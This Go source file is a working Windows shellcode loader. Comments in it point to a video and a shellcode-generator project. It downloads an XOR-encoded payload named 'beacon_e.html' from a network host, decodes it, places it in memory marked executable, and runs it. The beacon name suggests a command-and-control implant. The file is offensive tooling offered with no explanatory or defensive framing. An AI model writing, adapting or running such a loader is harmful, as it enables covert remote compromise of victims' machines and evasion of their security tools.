//https://www.youtube.com/watch?v=gH9qyHVc9-M&t=890s
//https://github.com/RCStep/CSSG


package main

import (
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func xor_decryption(buf []byte, xorchar byte) []byte {
	res := make([]byte, len(buf))
	for i := 0; i < len(buf); i++ {
		res[i] = xorchar ^ buf[i]
	}
	return res
}

func run(sc []byte) {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")

	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualAlloc(): %s", err.Error()))
	}

	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualProtect(): %s", err.Error()))
	}

	syscall.Syscall(addr, 0, 0, 0, 0)

}

func main() {

	
	resp, err := http.Get("http://192.168.1.125:80/beacon_e.html") // http://path/to/shellcode.html
	if err != nil {
		panic(err.Error())
	}
	defer resp.Body.Close()
	var xor_key byte = 'e'

	if resp.StatusCode == http.StatusOK {
		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			panic(err.Error())
		}

		bodyString := string(xor_decryption(bodyBytes, xor_key))
		//log.Println(bodyString)
		//log.Println(snellcode)
		snellcode_hex, err := hex.DecodeString(bodyString)
		//log.Println(snellcode_hex)

		run(snellcode_hex)
	}

}
